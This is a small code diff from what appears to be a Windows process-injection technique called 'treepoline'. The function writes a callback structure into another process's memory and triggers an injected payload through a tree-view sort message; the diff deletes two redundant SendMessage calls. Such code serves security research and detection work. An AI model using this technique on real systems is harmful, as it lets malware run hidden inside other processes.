@@ -87,7 +87,6 @@ VOID treepoline(LPVOID payload, DWORD payloadSize) {
     
     // 4. Obtain the root item in tree list
     item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);
-    SendMessage(tlv, TVM_SELECTITEM, TVGN_CARET, (LPARAM)(item));
 
     tvs.hParent     = item;
     tvs.lpfnCompare = cs;
@@ -101,7 +100,6 @@ VOID treepoline(LPVOID payload, DWORD payloadSize) {
     WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
     
     // 6. Trigger payload
-    SendMessage(tlv, TVM_SORTCHILDREN, 0, (LPARAM)ds);
     SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);
 
     // 7. Free memory and close process handle
